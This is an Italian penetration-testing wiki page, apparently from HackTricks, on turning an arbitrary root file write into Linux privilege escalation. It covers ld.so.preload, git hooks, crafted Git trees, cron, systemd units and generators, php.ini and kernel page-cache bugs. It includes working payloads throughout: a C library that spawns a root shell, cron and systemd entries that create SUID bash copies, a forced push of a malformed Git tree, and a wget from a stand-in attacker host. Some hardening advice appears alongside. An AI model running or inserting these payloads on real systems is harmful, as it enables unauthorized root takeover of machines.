# Scrittura arbitraria di file come root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

`/etc/ld.so.preload` è un elenco a livello di sistema di shared object che il dynamic linker carica prima degli altri shared object. La modalità di esecuzione sicura applica ulteriori restrizioni al preloading, quindi un percorso di libreria come `/tmp/pe.so` non è una tecnica universale per i binari SUID.\
Se puoi creare o modificare questo file, un processo che lo carica caricherà la libreria elencata prima degli altri shared object, consentendo l'esecuzione di codice nel contesto di quel processo.<sup>[[12]](#references)</sup>

Ad esempio: `echo "/tmp/pe.so" > /etc/ld.so.preload`

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unlink("/etc/ld.so.preload");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

### Output OCR come scrittura di file vincolata

Un servizio OCR che permette a chi effettua la richiesta di scegliere il nome del file salvato può trasformare il testo riconosciuto da un'immagine in una primitiva di **scrittura di file vincolata**. I byte salvati corrispondono al testo riconosciuto, non ai byte dell'immagine: controlla quindi l'output OCR per individuare eventuali errori di sintassi. Se la destinazione consentita è eseguibile dal web e accetta un nome di file `.php`, il testo può essere eseguito quando viene richiesto. In MakeSense, un'applicazione OCR raggiungibile localmente salvava il testo in `/saved/`; il suo server PHP eseguito come root eseguiva poi il file salvato come root. La scrittura era limitata a quella directory, senza alcun path traversal dimostrato.<sup>[[37]](#references)</sup>

Il privilegio ottenuto con l'esecuzione è quello del **processo che serve PHP**, non automaticamente quello dell'utente che scrive il file tramite OCR. Verifica la mappatura di esecuzione della destinazione e l'identità del processo in esecuzione: un writer OCR root abbinato a un server web non privilegiato non farebbe eseguire PHP come root.<sup>[[37]](#references)</sup> Confronta il pattern diretto di [upload nella web root](../../pentesting-web/file-upload/).

### Git hooks

I **Git hooks** sono script eseguibili avviati da eventi in un repository, incluse le operazioni di commit e merge. Se uno **script o utente privilegiato** esegue tali operazioni e un attacker può **scrivere nella cartella `.git`**, l'hook può essere usato per la **privilege escalation**.<sup>[[13]](#references)</sup>

Ad esempio, è possibile **generare uno script** in un repository git, in **`.git/hooks`**, in modo che venga eseguito ogni volta che viene creato un nuovo commit:

```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```

### Path traversal durante l'esportazione di un tree Git con privilegi

Un sincronizzatore privilegiato potrebbe evitare un checkout e invece enumerare un repository influenzato da un attaccante con `git ls-tree`, leggere ogni blob con `git cat-file`, unire il percorso riportato a una directory di staging e scrivervi direttamente. Questo si trasforma in una **scrittura arbitraria di file con i privilegi del sincronizzatore** quando combina `-c safe.directory=*` (disabilitando il controllo di Git sui repository con proprietari diversi) con l'assenza di un controllo che verifichi che la destinazione resti all'interno della directory. Un nome assoluto di una voce del tree fa sì che `os.path.join(stage, name)` di Python scarti `stage`; un nome relativo contenente `../` permette di uscire dalla directory quando il filesystem risolve il percorso. Poiché l'applicazione materializza il tree grezzo invece di chiedere a Git di eseguire il checkout, il rifiuto dei percorsi durante il checkout non protegge mai la destinazione.<sup>[[30]](#references)[[32]](#references)[[33]](#references)</sup>

Cerca questa struttura di codice in servizi root, timer, agenti di deployment, importatori di template e processi di backup/ripristino:<sup>[[30]](#references)</sup>

```python
entries = git("-c", "safe.directory=*", "ls-tree", "-rz", "HEAD")
for mode, oid, git_path in parse(entries):
    target = os.path.join(stage_root, git_path)  # no containment check
    os.makedirs(os.path.dirname(target), exist_ok=True)
    with open(target, "wb") as output:
        output.write(git("cat-file", "blob", oid))
```

Una voce dell'albero è codificata come `<mode> SP <name> NUL <raw object ID>`. L'opzione `git hash-object --literally` consente deliberatamente dati di oggetti che la normale analisi o `git fsck` potrebbero rifiutare, quindi un clone usa e getta può creare un albero il cui nome file è una destinazione assoluta. Questo esempio crea un blob per un file cron, racchiude l'albero appositamente creato in un commit e sposta un branch su di esso; lo sfruttamento richiede comunque il permesso di aggiornare un repository utilizzato dal job con privilegi elevati e un server Git che accetti l'oggetto malformato.<sup>[[30]](#references)[[31]](#references)</sup>

```bash
blob=$(printf '%s\n' '* * * * * root cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash' | git hash-object -w --stdin)
{ printf '100644 /etc/cron.d/git-sync\0'; printf '%s' "$blob" | xxd -r -p; } > tree.raw
tree=$(git hash-object -w -t tree --literally --stdin < tree.raw)
commit=$(printf 'crafted tree\n' | git commit-tree "$tree")
git update-ref refs/heads/main "$commit"
git ls-tree -r main
git push --force origin main
```

L'hardening deve coprire sia l'acquisizione dei repository sia l'operazione finale sul filesystem:<sup>[[30]](#references)[[33]](#references)[[34]](#references)</sup>

- Sostituisci `safe.directory=*` con i repository esatti di cui il servizio deve fidarsi e, ove possibile, esegui l'elaborazione dei repository senza privilegi di root.
- Rifiuta i nomi assoluti e qualsiasi componente `.` o `..` prima della materializzazione. Dopo aver unito i percorsi, canonizza il risultato e verifica che la destinazione rimanga all'interno della directory root prevista.
- Evita le race condition tra controllo e apertura dei symlink: apri i percorsi relativi a un descrittore di directory attendibile e, su Linux, usa `openat2()` con `RESOLVE_BENEATH` e `RESOLVE_NO_SYMLINKS` per i percorsi controllati da un utente malintenzionato.
- Preferisci un normale checkout in una directory isolata anziché reimplementare il checkout a partire dall'output dei plumbing command. Se è necessario acquisire raw object, abilita la validazione lato ricezione, ad esempio `receive.fsckObjects=true`; non declassare i rilievi `receive.fsck.*` relativi ai nomi dei percorsi, necessari per rifiutare alberi manipolati.

### Distribuzione di configurazioni con privilegi elevati

Alcuni servizi di gestione memorizzano lo stato di sistema desiderato in un file di configurazione e lo distribuiscono in seguito con privilegi elevati. Ad esempio, [openmediavault memorizza la configurazione in `/etc/openmediavault/config.xml`](https://docs.openmediavault.org/en/7.x/faq.html) e la sua [interfaccia RPC](https://docs.openmediavault.org/en/8.x/development/tools/omv_rpc.html) può applicare modifiche ai servizi. Se un account con privilegi inferiori può scrivere o sostituire quel file, verifica se può anche richiedere una distribuzione autorizzata e se il modulo selezionato usa come root il campo modificato. Le chiavi degli account SSH, i comandi pianificati e l'installazione di pacchetti hanno ciascuno prerequisiti diversi; la semplice presenza di un file o un file XML scrivibile non dimostrano nessuno di questi casi. Controlla i permessi del file e della directory padre, i gruppi dell'utente chiamante e le autorizzazioni RPC, la versione installata e il componente che effettivamente usa il file, senza modificare la configurazione né invocare un'operazione di applicazione durante la ricognizione.

Le definizioni delle action di Fail2Ban in `/etc/fail2ban/action.d/` costituiscono un altro confine di configurazione privilegiato. Un utente che può scrivere e cercare in quella directory potrebbe sostituire una definizione di action o aggiungere un override, ma i soli permessi della directory non dimostrano l'esecuzione di codice. Verifica che una jail abilitata selezioni effettivamente l'action interessata, che il servizio Fail2Ban la esegua con privilegi superiori e che si verifichino un reload/restart autorizzato e un evento di ban corrispondente. Un permesso sudo non correlato per riavviare Fail2Ban è rilevante solo se si applica all'esatta invocazione del servizio e la definizione modificata viene caricata. [La configurazione delle action di Fail2Ban](https://github.com/fail2ban/fail2ban/blob/master/man/jail.conf.5) documenta la relazione tra la directory delle action e le jail; la sua [action di esempio](https://github.com/fail2ban/fail2ban/blob/master/config/action.d/iptables.conf) mostra che `actionban` viene eseguita al momento del ban con i privilegi dell'utente del servizio. Esamina i permessi e la configurazione effettiva senza modificare le action né generare ban durante la ricognizione.

Un confine distinto si presenta quando una jail Fail2Ban abilitata usa un'azione mail che arricchisce i dati con WHOIS. [CVE-2021-32749](https://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm) riguardava testo WHOIS non attendibile passato tramite pipe a GNU mailutils `mail`, la cui gestione delle sequenze di escape poteva eseguire un comando. Un utente con privilegi inferiori che può scrivere file potrebbe influenzare la risposta se può modificare la configurazione di override del server del **client WHOIS selezionato**; [il file `whois.conf(5)` di Debian](https://manpages.debian.org/bookworm/whois/whois.conf.5.en.html) documenta un file di questo tipo, ma percorso e utilizzo variano a seconda dell'installazione. Esamina la jail/action effettiva, l'identità del servizio, il client WHOIS effettivo e il percorso del suo file di configurazione, l'implementazione mail, il controllo della risposta e la correzione o il backport del vendor installato. Un file di configurazione WHOIS scrivibile, una versione di Fail2Ban o una mail action, presi singolarmente, non dimostrano questa catena; evita di interrogare un server esterno o attivare ban durante la ricognizione passiva.

### Creazione di file TFTP e hook privilegiati dei pacchetti

Un servizio TFTP accessibile può superare un confine tra container o tra utenti locali quando le sue impostazioni **effettive** di tftpd-hpa lo eseguono come root, espongono la root del filesystem come directory `--secure` e abilitano `--create`. [Il manuale di tftpd-hpa](https://manpages.debian.org/trixie/tftpd-hpa/tftpd.8.en.html) descrive le opzioni di creazione e utente. Questo può consentire di creare un nuovo file in una directory di configurazione privilegiata, inclusa `/etc/apt/apt.conf.d/`; un file esistente potrebbe comunque non essere sostituibile. [Il manuale di configurazione di APT](https://manpages.debian.org/bookworm/apt/apt.conf.5.en.html) documenta i comandi `APT::Update::Pre-Invoke`. Un `apt update` eseguito come root può diventare il componente che agisce con privilegi superiori **solo se** legge il nuovo file di configurazione. Verifica gli argomenti e l'identità effettivi del demone in esecuzione, la raggiungibilità e i filtri di rete, le regole di creazione della directory di destinazione, l'ambito effettivo della configurazione di APT e una successiva invocazione privilegiata. Un file predefinito, una directory di destinazione scrivibile o un comando APT pianificato, presi singolarmente, non dimostrano l'intero percorso. La ricognizione passiva dovrebbe limitarsi a leggere configurazioni e metadati locali in quantità limitata, senza caricare file né invocare APT.

### File Cron e temporali

Se puoi **scrivere file relativi a cron che vengono eseguiti da root**, di solito puoi ottenere l'esecuzione di codice alla successiva esecuzione del job. Tra i target interessanti:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Il crontab di root in `/var/spool/cron/` o `/var/spool/cron/crontabs/`
- I timer `systemd` e i servizi che attivano

Controlli rapidi:

```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```

Percorsi tipici di abuso:

- **Aggiungere un nuovo cron job root** a `/etc/crontab` o a un file in `/etc/cron.d/`
- **Sostituire uno script** già eseguito da `run-parts`
- **Inserire una backdoor in un target timer esistente** modificando lo script o il binario che avvia

Esempio minimo di cron payload:

```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```

Se puoi scrivere solo all'interno di una directory cron utilizzata da `run-parts`, inserisci invece lì un file eseguibile:

```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```

Note:

- `run-parts` di solito ignora i nomi di file che contengono punti, quindi preferisci nomi come `backup` anziché `backup.sh`.<sup>[[15]](#references)</sup>
- Alcuni sistemi usano timer `systemd` invece del cron classico, ma l’idea dell’abuso è la stessa: **modificare ciò che root eseguirà in seguito**.<sup>[[20]](#references)</sup>

### File di servizio e socket

Se puoi scrivere **file unit `systemd`** o file a cui fanno riferimento, potresti riuscire a eseguire codice come root ricaricando e riavviando l’unità, oppure aspettando che si attivi il percorso di attivazione del servizio/socket.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

Controlla anche i permessi di scrittura e ricerca sulla directory delle unità di sistema, inclusi gli ACL: un utente può creare una nuova unità in `/etc/systemd/system` anche se non è autorizzato a leggere/elencare il contenuto della directory. Questo percorso, da solo, non avvia nulla. Verifica che il system manager carichi la nuova unità, che il chiamante disponga di un’autorizzazione effettiva `systemctl start` o `restart` con privilegi root per il suo nome (o di un altro percorso di attivazione privilegiato) e che il servizio venga eseguito con l’identità prevista. Una modifica su disco a un’unità già caricata potrebbe richiedere `daemon-reload`; il comportamento di caricamento è diverso per un’unità con un nuovo nome. Esamina gli argomenti e le esclusioni esatte di sudo prima di considerare sufficiente una regola di riavvio con caratteri jolly. Consulta il [percorso di ricerca delle unità systemd](https://www.freedesktop.org/software/systemd/man/latest/systemd.unit.html) e la [semantica di caricamento e ricaricamento di systemctl](https://www.freedesktop.org/software/systemd/man/latest/systemctl.html).

Tra i target interessanti:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Override drop-in in `/etc/systemd/system/<unit>.d/*.conf`
- Script/binari di servizio referenziati da `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Percorsi `EnvironmentFile=` scrivibili caricati da un servizio root

Controlli rapidi:

```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```

Percorsi comuni di abuso:

- **Sovrascrivere `ExecStart=`** in un'unità di servizio di proprietà di root che puoi modificare
- **Aggiungere un override drop-in** con un `ExecStart=` malevolo e cancellare prima quello precedente
- **Inserire una backdoor nello script/binario** già referenziato dall'unità
- **Dirottare un servizio attivato da socket** modificando il file `.service` corrispondente, che viene avviato quando il socket riceve una connessione

Esempio di override malevolo:

```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```

Flusso di attivazione tipico:

```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```

Se non puoi riavviare i servizi ma puoi modificare un’unità attivata tramite socket, potrebbe bastare **attendere una connessione client** per avviare come root l’esecuzione del servizio backdoorato.<sup>[[17]](#references)</sup>

### Directory dei generatori systemd

I **System generators** sono eseguibili avviati dal system manager prima che carichi i file delle unità, sia durante l’avvio sia durante il reload della configurazione. Di conseguenza, poter scrivere in una directory dei system generators (o in un eseguibile generator già esistente) fornisce un meccanismo diretto per eseguire codice come root, facile da non notare se un audit controlla solo i file `*.service` e `*.timer`.<sup>[[35]](#references)[[36]](#references)</sup>

L’ordine di ricerca abituale è `/run/systemd/system-generators/`, `/etc/systemd/system-generators/`, `/usr/local/lib/systemd/system-generators/` e `/usr/lib/systemd/system-generators/` (alcune distribuzioni rendono disponibile `/lib/systemd/system-generators/` tramite l’unione di `/usr`). Un eseguibile con lo stesso nome in una directory precedente ha la precedenza su quello nelle directory successive. Non confondere queste **directory degli eseguibili di input** con `/run/systemd/generator`, `/run/systemd/generator.early` e `/run/systemd/generator.late`, che contengono l’output temporaneo delle unità generato dai generator.<sup>[[35]](#references)</sup>

Controlli rapidi:

```bash
for d in /run/systemd/system-generators /etc/systemd/system-generators \
         /usr/local/lib/systemd/system-generators /usr/lib/systemd/system-generators \
         /lib/systemd/system-generators; do
    [ -e "$d" ] || continue
    namei -l "$d"
    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
    getfacl -p "$d" "$d"/* 2>/dev/null
done
```

Un generator appena creato deve avere impostato il bit di esecuzione. Se la write primitive controlla i byte ma non i permessi, usa un generator già eseguibile; troncarlo sul posto in genere ne preserva i metadati. Se la directory è scrivibile, crea una nuova entry e impostala come eseguibile.<sup>[[35]](#references)</sup>

```bash
cat > /etc/systemd/system-generators/zz-update <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown 0:0 /tmp/rootbash
chmod 4755 /tmp/rootbash
rm -f "$0"
EOF
chmod 755 /etc/systemd/system-generators/zz-update
```

Triggering `systemctl daemon-reload` sul manager **system** richiede un'autorizzazione adeguata, ma riesegue tutti i generator di sistema; altrimenti, attendi un reload con privilegi, un'operazione sui pacchetti o un riavvio. Le directory dei generator utente, come `~/.config/systemd/user-generators/`, vengono eseguite dal manager utente e **non** forniscono privilegi root da sole.<sup>[[35]](#references)</sup>

Per l'hardening e la ricerca di minacce, verifica ogni componente del percorso e gli ACL, non solo i bit di modalità finali; crea una baseline degli hash e della proprietà dei pacchetti dei generator e genera un alert in caso di creazione, rinomina, modifica del contenuto o dei permessi in tutte le directory di input dei generator di sistema. Monitorare la scrittura è importante perché un generator one-shot può eliminarsi dopo l'esecuzione, mentre l'albero delle unit generate sotto `/run/systemd/generator*` viene ricreato al reload successivo.<sup>[[35]](#references)[[36]](#references)</sup>

### Sovrascrivere un `php.ini` restrittivo usato da una sandbox PHP con privilegi elevati

Alcuni daemon personalizzati convalidano il PHP fornito dall'utente eseguendo `php` con un **`php.ini` restrittivo** (ad esempio, `disable_functions=exec,system,...`). Se il codice isolato nella sandbox dispone ancora di **una qualsiasi primitiva di scrittura** (come `file_put_contents`) e puoi raggiungere il **percorso esatto di `php.ini`** usato dal daemon, puoi **sovrascrivere quella configurazione** per rimuovere le restrizioni e poi inviare un secondo payload che viene eseguito con privilegi elevati.<sup>[[2]](#references)</sup>

Flusso tipico:

1. Il primo payload sovrascrive la configurazione della sandbox.
2. Il secondo payload esegue codice, ora che le funzioni pericolose sono state riabilitate.

Esempio minimo (sostituisci il percorso usato dal daemon):

```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```

Se il daemon viene eseguito come root (o convalida percorsi di proprietà di root), la seconda esecuzione ottiene un contesto root. Si tratta essenzialmente di **privilege escalation via config overwrite** quando il runtime isolato può ancora scrivere file.

### binfmt_misc

`binfmt_misc` espone le registrazioni in `/proc/sys/fs/binfmt_misc`; ogni registrazione associa un pattern di tipo file a un interprete. L'impatto sui privilegi dipende da chi può modificare la registrazione e da quale processo esegue successivamente il file corrispondente: verifica questi requisiti prima di considerarla una via di privilege escalation.<sup>[[21]](#references)</sup>

Un helper eseguibile con `CAP_DAC_OVERRIDE` può costituire un percorso di registrazione distinto se accetta dati controllati dal chiamante e li scrive in `/proc/sys/fs/binfmt_misc/register`, anche quando il chiamante non può scrivere direttamente in quel nodo. Esamina l'input e il comportamento di scrittura dell'helper senza eseguirlo durante la ricognizione. Se una regola registrata usa il flag `C`, l'interprete riceve credenziali basate sul binario corrispondente; una corrispondenza SUID di proprietà di root può quindi eseguire come root un interprete controllato dal chiamante. Verifica il mount e le policy di registrazione di `binfmt_misc`, la capability effettiva dell'helper, la regola esatta e il percorso dell'interprete, il target SUID eseguibile e se `no_new_privs` o un mount `nosuid` impediscono la transizione SUID. Un bit di capability o una stringa di percorso incorporata sono soltanto indizi da approfondire.<sup>[[21]](#references)</sup> Consulta [execve(2)](https://man7.org/linux/man-pages/man2/execve.2.html) per le condizioni che impediscono l'attivazione di SUID.

### Sovrascrivere gli handler dello schema (come http: o https:)

Gli ambienti desktop usano associazioni MIME e voci desktop per scegliere un'applicazione per gli schemi URI; un attaccante che può scrivere nella configurazione per utente e nelle directory delle voci desktop pertinenti può reindirizzare tali schemi a un launcher sotto il proprio controllo. Modificando il file `$HOME/.config/mimeapps.list` per associare gli handler degli URL HTTP e HTTPS a un file malevolo (ad esempio, `x-scheme-handler/http=evil.desktop` e `x-scheme-handler/https=evil.desktop`), un clic dell'utente può avviare quella voce desktop.<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```

### Esecuzione come root di script/binari scrivibili dall'utente

Se un workflow con privilegi esegue qualcosa come `/bin/sh /home/username/.../script` (o un qualsiasi binary all'interno di una directory di proprietà di un utente senza privilegi), puoi hijackarlo:<sup>[[1]](#references)</sup>

- **Rileva l'esecuzione:** monitora i processi con pspy per rilevare root mentre invoca percorsi controllati dall'utente.<sup>[[25]](#references)</sup>

```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```

- **Verifica la scrivibilità:** assicurati che il file di destinazione e la relativa directory siano di proprietà del tuo utente o scrivibili da esso.
- **Hijack del target:** crea un backup del binario/script originale e inserisci un payload che crei una shell SUID (o esegua qualsiasi altra azione come root), quindi ripristina i permessi:

```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```

- **Attiva l’azione privilegiata** (ad es., premendo un pulsante dell’interfaccia che avvia l’helper). Quando root riesegue il percorso dirottato, ottieni la shell con privilegi elevati con `./rootshell -p`.

### Modifica dei file binari privilegiati solo nella page cache

Alcuni bug del kernel non modificano il file **su disco**. Permettono invece di modificare soltanto la **copia nella page cache** di un file leggibile. Se riesci a colpire un binario **setuid** o comunque **eseguito da root**, la successiva esecuzione potrebbe avviare byte controllati dall’attaccante presenti in memoria ed elevare i privilegi, anche se l’hash del file su disco non è cambiato.<sup>[[3]](#references)[[4]](#references)</sup>

È utile considerarla una **primitive di scrittura di file limitata al runtime**:<sup>[[3]](#references)</sup>

- **Il disco resta pulito**: l’inode e i byte su disco non cambiano
- **La memoria è alterata**: i processi che leggono/eseguono la pagina in cache ottengono il contenuto modificato dall’attaccante
- **L’effetto è temporaneo**: la modifica scompare dopo il riavvio o l’espulsione dalla cache

Questa primitive si colloca tra la classica **scrittura arbitraria di file** e i vecchi bug di **abuso della page cache** come Dirty COW / Dirty Pipe:<sup>[[3]](#references)</sup>

- Dirty COW si basava su una race
- Dirty Pipe aveva vincoli sulla posizione di scrittura
- Una primitive limitata alla page cache può essere più affidabile se il percorso vulnerabile consente scritture dirette nelle pagine della cache associate ai file

#### Flusso generico di privesc

1. Ottieni una primitive del kernel che consenta di scrivere nelle **pagine della page cache associate ai file**
2. Usala contro un **binario privilegiato leggibile** o un altro file eseguito da root
3. Attiva l’esecuzione **prima** che la pagina venga espulsa dalla cache
4. Ottieni l’esecuzione di codice come root mentre il file su disco sembra ancora inalterato

Obiettivi tipici di alto valore:

- Binari **setuid-root**
- Helper avviati da **servizi root**
- Binari comunemente eseguiti da **container che condividono il kernel/la page cache dell’host**

#### Percorso di esempio con AF_ALG + `splice()`

Copy Fail (CVE-2026-31431) è un buon esempio di questa categoria. Il percorso vulnerabile era nell’API crypto userspace di Linux (`AF_ALG` / `algif_aead`):<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` può trasferire riferimenti alle pagine della page cache di un file leggibile nello scatterlist TX della crypto
- Il percorso di decrittazione in-place di `algif_aead` riutilizzava i buffer di origine e destinazione
- `authencesn` scriveva quindi nella regione del tag di destinazione
- Quando quella regione faceva ancora riferimento a pagine associate al file ottenute tramite splice, la scrittura finiva nella **page cache del file bersaglio**

La tecnica interessante, quindi, non è la CVE in sé, ma lo schema:

- **fornire al sottosistema del kernel pagine della cache associate ai file**
- fare in modo che il sottosistema le **tratti come output scrivibile**
- attivare una piccola sovrascrittura controllata in memoria

Il PoC pubblico usava ripetute **scritture da 4 byte** per modificare `/usr/bin/su` in memoria e poi lo eseguiva.<sup>[[4]](#references)[[7]](#references)</sup>

#### Percorso di esempio con clone ESP / XFRM + netfilter TEE

DirtyClone (CVE-2026-43503) mostra un’altra variante dello stesso schema di **scrittura nella page cache per ottenere root**, ma questa volta il punto di destinazione è la **decrittazione IPsec ESP** anziché `AF_ALG`.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

La tecnica importante è il **passaggio di riciclaggio dei metadati**:

- `splice()` inserisce una **pagina della page cache associata a un file in sola lettura** in un pacchetto ESP-in-UDP
- La mitigazione originale di DirtyFrag contrassegnava quello skb con `SKBFL_SHARED_FRAG`, affinché `esp_input()` **copiasse i dati prima di decrittarli**
- netfilter `TEE` duplica il pacchetto tramite `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- Il clone mantiene lo **stesso riferimento fisico alla pagina della page cache**, ma perde `SKBFL_SHARED_FRAG`
- `esp_input()` considera quindi sicuro il clone ed esegue la decrittazione **in-place di `cbc(aes)`** sulla pagina associata al file

La lezione per i reviewer va oltre la CVE: se una mitigazione si basa sui **metadati di skb/pagina** per decidere se sia necessario copiare prima di un’operazione, qualsiasi **percorso di clonazione/copia che mantenga la pagina sottostante ma scarti i metadati** può riaprire silenziosamente la primitive di scrittura.

Flusso di exploit tipico:

1. Usa `unshare(CLONE_NEWUSER | CLONE_NEWNET)` per ottenere **`CAP_NET_ADMIN` all’interno di un namespace di rete privato**
2. Attiva il loopback e installa una regola netfilter **`TEE`** in `mangle/OUTPUT`
3. Installa le SA di trasporto XFRM ESP tramite `NETLINK_XFRM`
4. Codifica ciascuna word bersaglio da 4 byte nel campo `seq_hi` della SA (il trucco di DirtyFrag per selezionare le word)
5. Invia il pacchetto ESP-in-UDP ottenuto tramite splice, in modo che il **clone TEE** raggiunga `esp_input()` e venga decrittato **in-place**
6. Ripeti finché la copia nella page cache di `/usr/bin/su` o di un altro eseguibile privilegiato non contiene codice controllato dall’attaccante

Dal punto di vista operativo, l’impatto è lo stesso dell’esempio con `AF_ALG`: il file su disco resta pulito, ma `execve()` usa i **byte modificati nella page cache** e concede root.<sup>[[8]](#references)[[9]](#references)</sup>

Controlli utili per verificare l’esposizione a questa variante:

```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```

La riduzione della superficie di attacco a breve termine è specifica anche in questo caso: l’aggiornamento a un kernel che include `48f6a5356a33` corregge il percorso di `clone`, mentre bloccare l’autocaricamento di `xt_TEE` rimuove il **passaggio di flag-laundering** e bloccare `esp4` / `esp6` rimuove il **sink di decrittazione**.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### Esposizione e ricerca di indicatori

Se sospetti questa classe di bug, non affidarti solo ai controlli di integrità del disco. Verifica anche:

```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```

I valori di configurazione riportati di seguito distinguono un'interfaccia caricabile da una integrata nel kernel; le regole di compilazione di crypto associano `CONFIG_CRYPTO_USER_API_AEAD` a `algif_aead`.<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` può essere caricato e scaricato come modulo
- `CONFIG_CRYPTO_USER_API_AEAD=y`: l'interfaccia è integrata nel kernel
- i binari setuid sono buoni obiettivi perché una patch che modifica solo la page cache può bastare a trasformare un foothold locale in root

#### Riduzione della superficie di attacco per il percorso `algif_aead`

Se l'interfaccia vulnerabile è fornita da un modulo caricabile:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>

```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```

Se è compilato nel kernel, alcune segnalazioni hanno riportato il blocco del percorso init con:<sup>[[28]](#references)</sup>

```bash
initcall_blacklist=algif_aead_init
```

Questo tipo di mitigazione vale la pena ricordarlo anche per altri LPE del kernel: se lo sfruttamento dipende da una specifica interfaccia opzionale, disabilitare o inserire nella blacklist tale interfaccia può interrompere il percorso di exploit anche prima che sia disponibile un aggiornamento completo del kernel.<sup>[[6]](#references)[[28]](#references)</sup>



{{#include ../../banners/hacktricks-training.md}}

## References

- [1] [HTB Bamboo – dirottare uno script eseguito da root in una directory PaperCut scrivibile dall'utente](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: Copy Fail (CVE-2026-31431) — FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [Segnalazione di Openwall oss-security per CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Correzione per Linux stable: crypto: algif_aead - Ripristino del funzionamento out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — avviso su CVE-2026-31431](https://copy.fail/)
- [7] [Analisi tecnica di Theori / Xint](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [Repository DirtyClone / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: analisi e sfruttamento della variante LPE Linux DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Correzione Linux: net: skb: mantenere `SKBFL_SHARED_FRAG` in `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Mitigazione precedente per Linux: impostare `SKBFL_SHARED_FRAG` per i pacchetti UDP sottoposti a splice (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — pagina del manuale Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
